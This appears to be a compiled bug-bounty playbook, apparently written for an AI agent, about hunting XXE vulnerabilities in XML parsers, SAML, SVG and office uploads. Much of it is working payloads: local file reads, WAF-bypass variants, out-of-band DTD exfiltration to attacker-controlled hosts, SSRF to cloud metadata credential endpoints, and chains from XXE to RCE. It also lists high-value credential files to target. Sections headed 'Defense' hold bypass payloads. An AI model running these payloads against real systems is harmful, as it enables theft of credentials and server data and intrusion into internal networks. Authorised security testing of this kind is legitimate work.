# Unified upstream methodology

Collected from every contributing repository skill. Deduplicated by content hash; full originals are preserved in `references/upstream-*.md`.

## Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Find XML parsers: SOAP, SAML, RSS, SVG, office docs, config imports.
- Test external entity file read and SSRF via SYSTEM identifiers.
- Try blind/OOB XXE with parameter entities and DNS callbacks.
- Test XInclude and error-based XXE when entities are blocked.
- Check SAML signature handling for XML signature wrapping.

### Deeper checklist

- Find XML parsers: SOAP, SAML, RSS, SVG, office documents, config imports.
- Test external entity file read and SSRF via SYSTEM identifiers.
- Try blind/OOB XXE with parameter entities and DNS callbacks.
- Test XInclude and error-based XXE when direct entities are blocked.
- Check SAML signature handling for XML signature wrapping.
- Read a harmless file or trigger a callback as proof.

### Step-by-Step Hunting Methodology

1. **Map every XML entry point** — Use Burp Suite passive scanner to flag all requests/responses with XML content types. Also intercept JSON endpoints and manually swap `Content-Type` to `application/xml` with equivalent XML body.

2. **Identify file upload features** — Upload SVG, DOCX, XLSX, and observe if the server processes/renders content. These are often XML under the hood.

3. **Attempt inline XXE (classic file read)** — Replace the XML body with a basic entity test payload targeting `/etc/passwd` or `C:\Windows\win.ini`. Observe if the value is reflected in the response.

4. **If no reflection, pivot to Blind OOB** — Set up an OOB listener (Burp Collaborator, interactsh, or a self-hosted netcat server). Inject an external entity pointing to your callback URL. Confirm DNS/HTTP hit to validate the parser is making outbound connections.

5. **Escalate Blind OOB to file exfiltration** — Use a two-stage payload: first entity loads local file, second entity sends it OOB via HTTP parameter or DNS exfiltration.

6. **Test SSRF pivot** — Point the external entity at internal network addresses (`http://169.254.169.254/latest/meta-data/`, `http://10.0.0.1/`, `http://localhost:8080/admin`). Look for differences in response timing or error messages.

7. **Test all subdomains sharing the same backend** — If one subdomain is vulnerable, enumerate and test all others systematically. Shared backend infrastructure means shared vulnerability.

8. **Test parameter-level injection** — Some endpoints parse only specific XML nodes. Inject entities into every element value, attribute value, and even element names.

9. **Test for error-based exfiltration** — If OOB is blocked, trigger XML parsing errors that include file content in the error message returned to the client.

10. **Document the full impact chain** — Demonstrate: file read → SSRF → internal service access → note which internal domains/IPs are reachable.

---

### A. Discovery checklist — concrete places, params, headers, file types to look

- Map every XML entry point: `/api/v*/xml`, `/upload`, `/import`, `/parse`, `/convert`, `/saml/acs`, `/sso/saml`, `/feed`, `/rss`, `/soap/*`, `/wsdl`, `/service.asmx`, `/xmlrpc`.
- Test JSON endpoints by swapping `Content-Type` to `application/xml` / `text/xml` with an equivalent XML body — hidden XML parsers are a recurring source of high-value findings.
- File-upload surfaces that are XML inside a container: SVG, DOCX, XLSX, PPTX, ODT, GPX, KML, `.xml` configs, SOAP attachments, and PDFs (iText CVE-2017-9096, 2025 writeups).
- Office-doc specifics: modify `word/document.xml`, `ppt/slides/slide1.xml`, or `xl/worksheets/sheet1.xml` inside the ZIP; an XLSX needs all five boilerplate parts (`[Content_Types].xml`, `.rels`, `workbook.xml`, `workbook.xml.rels`, `sheet1.xml`) or the parser rejects it before entity processing.
- Hidden attack surface per PortSwigger: XInclude (`<xi:include href=...>`) when `DOCTYPE` is blocked, file-upload XXE, and `Content-Type`-converted XXE.
- Error-message channels matter as much as reflection: verbose Java/JDOM/Xerces, Spring, and `SAML exception:` / `Error creating JDOM document from XML string:` strings turn parser errors into an exfiltration channel.
- WAF signal: Imperva and others blocking the literal word `DOCTYPE` anywhere in a POST body — confirm the block, then look for a parser path where the DTD is inside a ZIP/XML part rather than the raw body.
- 2025-2026 real targets: Akamai CloudTest CVE-2025-49493 (SOAP/WSDL, Java 1.8), NASA unauth SAML XXE (Bugcrowd P1, 2025), ArubaOS 8.13.2.0 pre-auth XXE on port 32000, Adobe Commerce CosmicSting CVE-2024-34102.

## Signals and surfaces

### Signal

- Reports: **64** · paid: **11**
- Median bounty **$1,000** · p90 **$2,500** · max **$6,000** · total **$17,600**
- Median upvotes **24**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| Mail.ru | 9 | $8,800 | 451 |
| Pornhub | 2 | $2,500 | 228 |
| Open-Xchange | 1 | $2,000 | 86 |
| GitHub Security Lab | 2 | $1,800 | 10 |
| Rockstar Games | 1 | $1,500 | 79 |
| Uber | 2 | $500 | 67 |
| VK.com | 1 | $500 | 18 |
| Informatica | 8 | $0 | 275 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`xml` `soap` `saml` `svg` `docx` `xlsx` `import` `feed` `rss`

### Crown Jewel Targets

XXE is a critical-severity vulnerability that consistently pays at the top of bug bounty scales ($5,000–$30,000+) due to its direct path to sensitive data exfiltration and SSRF. Highest-value targets:

- **Large enterprise platforms** with XML-heavy backend integrations (finance, logistics, ride-sharing APIs)
- **Domains with file-read capability** — `/etc/passwd`, `/etc/shadow`, internal config files, AWS metadata endpoints
- **Subdomains sharing backend infrastructure** — one XXE endpoint can pivot to internal services across dozens of domains (as demonstrated by 26+ Uber domains via a single entry point)
- **API gateways** accepting XML content types — especially REST APIs that silently accept `Content-Type: application/xml`
- **File upload features** — SVG, DOCX, XLSX, PDF, PPTX parsers on the server side
- **SAML/SSO endpoints** — SAML assertions are XML-based and frequently vulnerable
- **Office/document processing services** — any feature that converts or processes user-supplied documents

---

### Tech Stack Signals

- **Java stacks**: Spring, Struts, JAX-WS — default XML parsers (SAX, DOM) are XXE-vulnerable without explicit hardening
- **PHP**: `simplexml_load_string()`, `DOMDocument::loadXML()` — vulnerable by default pre-PHP 8
- **Python**: `lxml`, `xml.etree` (safe by default), `xml.sax` (unsafe)
- **Ruby**: `Nokogiri` older versions, `REXML`
- **Node.js**: `xml2js`, `libxmljs`, `fast-xml-parser` (older versions)
- **WSDL/SOAP services**: Always test — legacy XML parsing virtually guaranteed
- **File parsers**: Apache POI (Java), python-docx, LibreOffice integrations

---

## Techniques, payloads and bypasses

### Payloads & probes

- `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`
- OOB -> `<!ENTITY % f SYSTEM "http://callback/%file;">`
- XInclude -> `<xi:include href="file:///etc/passwd" parse="text"/>`
- SVG -> `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>`

### Payload bank

**23 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Filter bypass

```text
<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd" >]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e PUBLIC "x" "file:///etc/passwd">]><x>&e;</x>
```

Copyable lists:
- `~/.local/share/hackerone-reports/wordlists/payloads_xxe.txt` (23)
- `~/.local/share/hackerone-reports/wordlists/payloads_xxe_waf.txt` (5 filter/WAF-focused)

### Bypass tricks

- Use UTF-16/UTF-7 encodings to bypass naive filters.
- Parameter entities and external DTDs when general entities are disabled.
- Error-based extraction when output is not reflected.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx** — `#500515` · Starbucks · $0 · ▲319
  > POST /retail/hxpublic v6/hxdynamicpage6.aspx? hxpage=tempfiles/temp uploaded d4e4c8c5-c4ab-4743-a6fd-c2d779a29734.xml&max file size kb=1024&allow file type list=xml;jpg;jpeg;png;bmp;
- **XXE on sms-be-vip.twitter.com in SXMP Processor** — `#248668` · X / xAI · $0 · ▲258
  > In addition to local file read, it was confirmed through testing that if "file:///etc/passwd" is replaced with a URL, the servlet will make external requests and that it has outbound access to the internet.
- **XXE on https://duckduckgo.com** — `#483774` · DuckDuckGo · $0 · ▲218
  > An XML External Entity (XXE) injection vulnerability was discovered in the `x.js` endpoint on https://duckduckgo.com via `u` parameter.
- **Partial bypass of #483774 with Blind XXE on https://duckduckgo.com** — `#486732` · DuckDuckGo · $0 · ▲159
  > Blind XXE leads to `dos` and `blind injection`.
- **DMARC  Not found for paragonie.com   URGENT** — `#179828` · Paragon Initiative Enterprises · $0 · ▲147
  > "v=DMARC1;p=reject;pct=100;rua=mailto:postmaster@dmarcdomain.com"
- **XXE through injection of a payload in the XMP metadata of a JPEG file** — `#836877` · Informatica · $0 · ▲138
  > Specifically, the XXE attack is executed through the injection of a payload in the "XMP metadata" of the uploaded JPEG file.
- **XXE in Site Audit function exposing file and directory contents** — `#312543` · Semrush · $0 · ▲115
  > See the supporting materials below for an example of reading the `/etc/hostname` file and listing the contents of the `/home` directory.
- **XXE in DoD website that may lead to RCE** — `#227880` · U.S. Dept Of Defense · $0 · ▲97
  > An attacker can use an XML external entity vulnerability to send specially crafted unauthorized XML requests, which will be processed by the XML parser.
- **LFI and SSRF via XXE in emblem editor** — `#347139` · Rockstar Games · $1,500 · ▲79
  > By referencing a malicious external DTD in my hosted SVG file, I could extract text files, http responses, or even files from remote shares (again, using `//`).
- **Blind OOB XXE At "http://ubermovement.com/"** — `#154096` · Uber · $500 · ▲56
  > POST data was set to <?xml version="1.0" encoding="utf-8"? <!DOCTYPE dtgmlf6 [ <!ENTITY dtgmlf6ent SYSTEM "http://122.180.248.81/" ] <GeneralSearch &dtgmlf6ent;</GeneralSearch
- **RCE via Local File Read -> php unserialization-> XXE -> unpickling** — `#415501` · h1-5411-CTF · $0 · ▲46
  > template=../../../../../../../etc/passwd&type=text&top-text=ad&bottom-text=asd
- **[rev-app.informatica.com] - XXE** — `#105434` · Informatica · $0 · ▲45
  > <!DOCTYPE foo [ <!ELEMENT foo ANY <!ENTITY xxe PUBLIC "lol" "file:///etc/passwd" ]
- **xmlrpc.php &wp-cron.php files are enabled, and will used for (DDOS),(DOS) and broutforce users attack.** — `#2299069` · Nextcloud · $0 · ▲41
  > 3 to send alot of requests using xmlrpc.php https://nextcloud.com/wp-cron.php and if he wrote an python script to perform his attack with the header details , thes action can lead to stop wp-cron.php services .And he can make it using doser.go DOS attack tool…
- **Authenticated XXE** — `#1095645` · WordPress · $0 · ▲41
  > - trigger a Phar Deserialization by using the `phar://` stream wrapper within the XXE which can lead to further vulnerabilities, depending on the gadget chains available in the WordPress core and its plugins.
- **XXE on DoD web server** — `#188743` · U.S. Dept Of Defense · $0 · ▲38
  > dawgyg was able to exploit this vulnerability by crafting an XML request that revealed sensitive local system information.
- **[HTA2] XXE on https://███ via SpellCheck Endpoint.** — `#715949` · U.S. Dept Of Defense · $0 · ▲37
  > Log into `https://██████/` with the credentials `██████`
- **XML Parser Bug: XXE over which leads to RCE** — `#55431` · drchrono · $0 · ▲35
  > I was able to do XXE attack on your site and exposed the /etc/passwd file.
- **Singapore - XXE at https://www.starbucks.com.sg/RestApi/soap11** — `#762251` · Starbucks · $0 · ▲32
  > rugb discovered the endpoint at https://www.starbucks.com.sg/RestApi/ was found vulnerable to XML eXternal Entity (XXE) processing.
- **Reflected XSS and possible SSRF/XXE on https://events.hackerone.com/conferences/get_recording_slides_xml.xml?url=myserver/xss.xml** — `#1028396` · HackerOne · $0 · ▲32
  > events.hackerone.com was pointing towards a 3rd party vendor as a CNAME, I managed to find a full read SSRF and XXE vulnerability on an endpoint which belongs to the vendor via get recording slides xml.xml?url= endpoint that allowed me to achieve Reflected…
- **Non-production Open Database In Combination With XXE Leads To SSRF** — `#742808` · Evernote · $0 · ▲25
  > Access to the GCP project via the Google Cloud metadata endpoint which leads to access to at least the Google Cloud storage buckets and Google Cloud BigTable/BigQuery.
- **[app.informaticaondemand.com] XXE** — `#105753` · Informatica · $0 · ▲25
  > <!ENTITY % b PUBLIC "lol" "file:///etc/passwd"
- **XML External Entity (XXE) Injection** — `#2573567` · U.S. Dept Of Defense · $0 · ▲21
  > XML External Entity (XXE) injection vulnerability.
- **Uploaded XLF files result in External Entity Execution** — `#232614` · Weblate · $0 · ▲18
  > A minor modification shown in the steps below results in the /etc/passwd file out through the UI for review as a translation, although much worse things can be done - this is just to prove the vulnerability exists.
- **CCC H1 June 2021 CTF Writeup** — `#1217114` · h1-ctf · $0 · ▲16
  > Note that we tried various other recon techniques using the LFI including accessing local endpoints, trying to read source code, `/etc/passwd` etc., but these did not bear fruit, and in fact we found an `index.php` file containing a hash that rickrolled us :D
- **Flag WriteUp** — `#415202` · h1-5411-CTF · $0 · ▲15
  > Analyzing the requests I see that the `template` parameter value is a filename , so I try a path traversal with `../../../../../../../etc/passwd` and I get rick rolled :'( But changing the parameter `type` to `text` works !
- **XXE in the Connector Designer** — `#112116` · Bime · $0 · ▲15
  > A XML External Entity (XXE) vulnerability allowed an attacker to read arbitrary files on the server.
- **[marketplace.informatica.com] - XXE** — `#106797` · Informatica · $0 · ▲14
  > `<!ENTITY xxe SYSTEM "file:///etc/passwd1" ] `
- **[rev-app.informatica.com] - XXE via SAML** — `#106865` · Informatica · $0 · ▲12
  > `Referer: https://infapassport.okta.com/app/template saml/kwtbgh4jLAZPMXLQUNMU/sso/saml`
- **[usuppliers.uber.com] - Server Side Request Forgery via XXE OOB** — `#448598` · Uber · $0 · ▲11
  > It was possible to determine open internal ports on an usuppliers.uber.com server, via examination of different error messages to a specific POST request made with various payloads.
- **XXE with RCE potential on the https://█████████ (CVE-2017-3548)** — `#710654` · U.S. Dept Of Defense · $0 · ▲9
  > I determined that instance is available on localhost port 80, so it's possible to access `/pspc/services/AdminService` via XXE:

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 4× | `Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4` |
| 2× | `<!DOCTYPE svg [ / <!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd"> / %outside; / ]> / <svg> / <defs> / <pattern id="exploit"> / <t` |
| 2× | `<!ENTITY % data SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts"> / <!ENTITY exfil "%data;">` |
| 2× | `%eval` |
| 2× | `Content-Type: application/xml;charset=UTF-8` |
| 2× | `<?xml version="1.0" encoding="UTF-8" standalone="no"?>` |
| 2× | `<!DOCTYPE foo [` |
| 2× | `<params>` |
| 2× | `<offset>0</offset>` |
| 2× | `<queryParams>` |
| 2× | `<query>&xxe;</query>` |
| 2× | `<sortBy>relevance</sortBy>` |
| 2× | `<fieldList>["id", "title"]</fieldList>` |
| 2× | `</queryParams>` |
| 2× | `<source>marketplace</source>` |
| 2× | `<rows>5</rows>` |
| 2× | `</params>` |
| 1× | `POST /edit-profile-avatar!uploadImage.jspa HTTP/1.1 / Host: ███████informatica.com / [...REDACTED...PLEASE.SEE.SCREENSHOTS.FOR.FULL.PAYLOAD]` |
| 1× | `███" - - [05/Feb/2018:13:12:26 +0000] "GET /text.txt HTTP/1.1" 302 - "-" "Java/1.8.0_144` |
| 1× | `46.229.173.66" - - [05/Feb/2018:14:26:02 +0000] "GET /resp/███████ HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http:/` |

### Partial bypass of #483774 with Blind XXE on https://duckduckgo.com

`#486732` · DuckDuckGo · $0 · high · 2019-02-25 · ▲159
> Summary: Hi DuckDuckGo team, I've contacted previously you because in a second time (on the 483774 report), I've seen that was possible bypass the fix. Anyway, I've not got any response, and because I think that this is a bit dangerous issue, I'm opening another report for the bypass. Hope you'll agree. Steps for reproduction: 1. Attacker creates a public server and hosts a file with the following content: 2.

### Common Root Causes

1. **Default parser configurations** — Java's `DocumentBuilderFactory`, PHP's `DOMDocument`, and Python's `lxml` all support external entities by default. Developers use them without reading the security docs.

2. **Framework upgrades without security re-review** — Older versions of Spring, Struts, and similar frameworks enabled XXE by default; developers didn't re-audit XML handling when libraries changed.

3. **Hidden XML consumption** — Developers accept JSON at the API layer but convert to XML internally, or use libraries (Apache POI, python-docx) to process uploads without realizing those formats are XML containers.

4. **Copy-paste code from StackOverflow** — XML parsing examples online rarely include entity disabling. Developers copy minimal working examples straight into production.

5. **SAML/SSO library misconfigurations** — SSO integrations often delegate XML parsing to third-party libraries with XXE enabled; developers assume "library handles security."

6. **Testing gaps on non-primary content types** — QA tests JSON APIs extensively; XML code paths receive minimal security testing because they're secondary or legacy.

7. **Microservice XML messaging** — Internal service-to-service communication uses XML (SOAP, custom schemas) and is treated as a "trusted internal" concern, bypassing security review.

---

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Run the inline-entity gate first: `<!ENTITY hello "world!">` then `&hello;`. If `world!` does not echo, entity expansion is disabled and SYSTEM file:// will not work — pivot to OOB/SSRF or a different endpoint.
- Classic in-band read: `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` then `&xxe;` in a node; replace with `file:///etc/hostname` or `C:\Windows\win.ini` as controls.
- Binary-safe read: `php://filter/convert.base64-encode/resource=/path/to/file` — raw `<?php ... ?>` is parsed/swallowed and returns blank.
- Blind OOB detection with regular entity: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://<collab>/p"> ]>` + `&xxe;`. If regular entities are filtered, use a parameter entity: `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://<collab>/p"> %xxe; ]>`.
- Full OOB exfil with an external DTD hosted by you: `<!ENTITY % file SYSTEM "file:///etc/passwd">` + `<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<collab>/?x=%file;'>">` + `%eval; %exfil;`. Newlines break URL validation — target `/etc/hostname` or switch to FTP.
- Error-based exfil with no egress (UltraRed 2026 AWS-credential chain): point the exfil entity at a nonexistent path `file:///%file;` so Xerces embeds the file contents in its exception text. `%file` can be `http://169.254.169.254/...` — the IMDS JSON then appears verbatim in the response.
- Error-based via a local DTD when OOB is fully blocked: define `%local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"`, redefine an existing entity from that DTD with the error chain, then `%local_dtd;`. Enumerate candidate local DTDs by loading them and watching for "file not found".
- SSRF pivot through the parser: `<!ENTITY xxe SYSTEM "http://10.0.0.1/">` — reflection gives two-way interaction, absence gives blind SSRF. Port-scan localhost by varying the port and watching for non-empty responses.
- `file://` silently returns empty for files containing `<`, `>`, or `&` — the entity expansion breaks the parse. Use base64 filters or a different target file.
- Nested-deserialization XXE (CosmicSting): a REST JSON body whose nested value reaches `simplexml_load_string()` — read `app/etc/env.php` (admin crypt key) → forge admin token → RCE.

### Defense: WAF blocking XXE patterns

```xml
<!-- Chunked transfer encoding to bypass WAF inspection -->
Transfer-Encoding: chunked

<!-- HTTP request splitting with XML payload spread across chunks -->

<!-- Use XML comments to break signatures -->
<!-–- -->DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- Nested encoding -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "&#x66;&#x69;&#x6c;&#x65;:///etc/passwd">]>
```

## Validation and proof

### Parameter entities / OOB

```text
<!DOCTYPE x [<!ENTITY % f SYSTEM "http://callback/%file;">%f;]>
<!DOCTYPE x [<!ENTITY % p SYSTEM "http://callback/evil.dtd">%p;]><x>&send;</x>
<!DOCTYPE x [<!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'http://callback/%file;'>">%a;%b;]>
<!DOCTYPE x [<!ENTITY % remote SYSTEM "https://callback/evil.dtd">%remote;]>
```

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   - Can you show the contents of `/etc/passwd` or `win.ini` in the response? OR can you demonstrate a confirmed OOB callback with a file's contents transmitted to your server? OR can you reach an internal SSRF endpoint (metadata, internal admin)?

2. **What does the victim LOSE?**
   - Specific sensitive data must be identified: internal credentials, AWS IAM keys, application config files with DB passwords, PII, or internal network topology. "Parser made a DNS request" alone is insufficient — escalate to demonstrate actual data exposure or internal access.

3. **Can it be reproduced in 10 minutes from scratch?**
   - You must have a single `curl` command or Burp repeater request that a triage engineer can run against the live target and see the impact within 10 minutes, with zero ambiguity about the vulnerable parameter and endpoint.

---

### C. Validation / proof bar — how to confirm and avoid false positives

- A lone Collaborator DNS hit proves the parser fetches external entities; it is Informational/Low on its own. Escalate to actual file contents, a metadata JSON response, or internal HTTP access before claiming Critical.
- A blank reflection is usually a parse failure (illegal characters in the entity), not a missing file — retry with `/etc/hostname` or a base64 filter.
- For in-band reads, require a fingerprintable marker: `root:x:0:0:` in `/etc/passwd`, or base64 that decodes to recognizable source. Truncated base64 that still decodes is acceptable — report exactly what was recovered.
- Error-based reads must show the actual file content in the exception text, not just "file not found"; repeat with two different files to prove the channel is data-dependent.
- Distinguish parser hardening from a filter: if inline `&hello;` fails, the parser is hardened; if it succeeds but `SYSTEM` is blocked, an application filter is likely and encoding/entity tricks may work.
- Confirm OOB interactions are unique per sink by using a distinct Collaborator subdomain per parameter; delayed callbacks require polling for 30-120s.
- XInclude is a separate primitive — if `DOCTYPE` is rejected, try `<xi:include href="file:///etc/passwd" parse="text"/>` before concluding no XXE.
- 10-minute reproducibility: a single curl/Burp request that returns real file content or a confirmed internal HTTP response. A stack trace alone is not sufficient impact for a high severity.

**Entity-mechanics cheat sheet (why each payload works):**
- General entity: declared `<!ENTITY name "value">`, referenced `&name;` — usable in document content.
- Parameter entity: declared `<!ENTITY % name "value">`, referenced `%name;` — usable only inside the DTD; the `%` prefix is what makes blind OOB work.
- External entity: `SYSTEM "URL"` — the URL can be `file://`, `http://`, `ftp://`, `gopher://` (libxml2), `jar://`/`netdoc://` (Java), `expect://` (PHP if enabled).
- Nested parameter-entity references are forbidden inside an *internal* DTD subset — this is why the exfil chain must live in an externally hosted DTD (or be repurposed from a local one).
- The `&#x25;` hex escape is required to write a literal `%` inside an entity value without triggering a parse error.
- XInclude works without any DOCTYPE: `<xi:include href="file:///etc/passwd" parse="text"/>` with `xmlns:xi="http://www.w3.org/2001/XInclude"`.

**High-value target files to aim at:**
- `/etc/passwd`, `/etc/hostname`, `/etc/hosts` — reliable proof-of-read markers.
- `app/etc/env.php` (Magento crypt key), `web.config` (ASP.NET machineKey), `.env`, `config/database.php`, `wp-config.php`.
- `~/.aws/credentials`, `/proc/self/environ`, `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`.
- Windows: `C:\Windows\win.ini`, `C:\inetpub\wwwroot\web.config`.

**Bypass notes for filtered/blocked XXE:**
- WAF blocks `DOCTYPE`: place the entity declaration inside a nested XML part of DOCX/XLSX (the WAF sees only the multipart wrapper), or use XInclude.
- Application strips `<!ENTITY`: try parameter-entity form, external DTD reference only (`<!ENTITY % xxe SYSTEM "http://<collab>/d.dtd"> %xxe;`), and UTF-16/UTF-7 encoded bodies.
- Egress blocked: error-based via local DTD repurposing, or repurpose an existing local DTD that the app already loads.
- DNS label limit (253 chars) kills large DNS exfil — use HTTP query strings or error-based reads instead.
- Multiline files break URL-based exfil — use `php://filter/convert.base64-encode/resource=` or target single-line files.
- Java `jar://` and `netdoc://` stream wrappers can substitute for `file://` on some JDKs when file reads are filtered; `expect://` on PHP can turn an XXE into direct command execution when the extension is loaded.
- Always test all data nodes individually: a real-world XML request often has many values, and only one of them may be wired into the reflected response or error path.

### Blind OOB — DNS/HTTP Callback

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR.BURPCOLLABORATOR.net/xxe-test">
]>
<root><data>&xxe;</data></root>
```

### Blind OOB — File Exfiltration via Parameter Entity (two-stage)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd">
  %dtd;
]>
<root><data>trigger</data></root>
```

**evil.dtd (hosted on attacker server):**
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%all;
```

### Defense: Network egress filtering (OOB blocked)

```xml
<!-- DNS-only exfiltration (port 53 often allowed) -->
<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://%data;.attacker.com/'>">

<!-- Error-based exfiltration (no outbound needed) -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///notexist/%file;'>">
  %eval; %error;
]>
```

### Defense: Content-Type validation

```
# Try mismatched Content-Type headers
Content-Type: application/json; charset=xml
Content-Type: application/xml+json
# Or simply omit Content-Type and let the server sniff
```

## Escalation and related chains

### Escalation chains

- XXE -> file read -> creds.
- XXE -> SSRF -> metadata.
- SAML wrapping -> admin.

### Related Skills & Chains

- **`ssrf`** — XXE is SSRF-with-XML-syntax once you discover the parser fetches external entities. Chain primitive: blind XXE OOB `<!ENTITY % x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role">` → exfil AWS IMDS creds via parameter-entity DTD callback → STS AssumeRole chain. Where pure SSRF is filter-blocked, `gopher://` via XXE-in-`libxml2` can still reach Redis/SMTP.
- **`file-upload`** — XXE most often hides inside file-upload features that quietly parse XML (DOCX/XLSX/PPTX, SVG, GPX, KML, OOXML, SOAP attachments). Chain primitive: upload DOCX with malicious `[Content_Types].xml` containing parameter-entity DTD → OOB file read of `/etc/passwd` / `web.config` / `.aws/credentials` via the document parser running server-side.
- **`rce`** — XXE → RCE is rare but real on PHP (`expect://`), Java (XSLT extensions with `<xsl:script>`/Xalan), and older XmlSpy/SAXON deployments. Chain primitive: XXE in a Java endpoint using a vulnerable XSLT processor → `<xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>` → RCE; or PHP XXE with `expect://id` stream wrapper enabled → direct RCE.
- **`sharepoint`** — On-prem SharePoint/Exchange/IIS stacks have a long history of XXE in SOAP/CSOM/EWS endpoints. Chain primitive: anonymous XXE in `_vti_bin/*.asmx` or EWS SOAP → read `web.config` → recover `<machineKey>` → ViewState deserialization → RCE (the ToolShell-adjacent precondition).
- **`security-arsenal`** — Reach for the XXE payload tree: standard SYSTEM file read, parameter-entity OOB DTD pattern (the `%` indirection that makes blind XXE work), `php://filter/convert.base64-encode/resource=` for binary-safe read, XInclude (`<xi:include href=...>`) when DOCTYPE is blocked, billion-laughs/quadratic-blowup for DoS, and the `jar://` / `netdoc://` Java-specific wrappers.
- **`triage-validation`** — Apply the Reproducibility + Pre-Severity Gates. An XXE that only triggers an OOB DNS callback with NO data exfil is Low/Medium (information disclosure of "this parser fetches entities"), not Critical. Critical needs proof of file read or internal HTTP — show the actual `/etc/passwd` content or the IMDS JSON response in the report.

---

### Related Skills & Chains

- **`hunt-ssrf`** — XXE is SSRF-with-XML-syntax once you discover the parser fetches external entities. Chain primitive: blind XXE OOB `<!ENTITY % x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role">` → exfil AWS IMDS creds via parameter-entity DTD callback → STS AssumeRole chain. Where pure SSRF is filter-blocked, `gopher://` via XXE-in-`libxml2` can still reach Redis/SMTP.
- **`hunt-file-upload`** — XXE most often hides inside file-upload features that quietly parse XML (DOCX/XLSX/PPTX, SVG, GPX, KML, OOXML, SOAP attachments). Chain primitive: upload DOCX with malicious `[Content_Types].xml` containing parameter-entity DTD → OOB file read of `/etc/passwd` / `web.config` / `.aws/credentials` via the document parser running server-side.
- **`hunt-rce`** — XXE → RCE is rare but real on PHP (`expect://`), Java (XSLT extensions with `<xsl:script>`/Xalan), and older XmlSpy/SAXON deployments. Chain primitive: XXE in a Java endpoint using a vulnerable XSLT processor → `<xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>` → RCE; or PHP XXE with `expect://id` stream wrapper enabled → direct RCE.
- **`hunt-sharepoint`** — On-prem SharePoint/Exchange/IIS stacks have a long history of XXE in SOAP/CSOM/EWS endpoints. Chain primitive: anonymous XXE in `_vti_bin/*.asmx` or EWS SOAP → read `web.config` → recover `<machineKey>` → ViewState deserialization → RCE (the ToolShell-adjacent precondition).
- **`security-arsenal`** — Reach for the XXE payload tree: standard SYSTEM file read, parameter-entity OOB DTD pattern (the `%` indirection that makes blind XXE work), `php://filter/convert.base64-encode/resource=` for binary-safe read, XInclude (`<xi:include href=...>`) when DOCTYPE is blocked, billion-laughs/quadratic-blowup for DoS, and the `jar://` / `netdoc://` Java-specific wrappers.
- **`triage-validation`** — Apply the Reproducibility + Pre-Severity Gates. An XXE that only triggers an OOB DNS callback with NO data exfil is Low/Medium (information disclosure of "this parser fetches entities"), not Critical. Critical needs proof of file read or internal HTTP — show the actual `/etc/passwd` content or the IMDS JSON response in the report.

## Tools and wordlists

### Tools

`Burp` · `xxe-exploit` · `interactsh` · `nuclei`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_xxe.txt` | 74 |
| `~/.local/share/hackerone-reports/wordlists/params_xxe.txt` | 15 |
| `~/.local/share/hackerone-reports/wordlists/payloads_xxe.txt` | 23 |
| `~/.local/share/hackerone-reports/wordlists/payloads_xxe_waf.txt` | 5 |
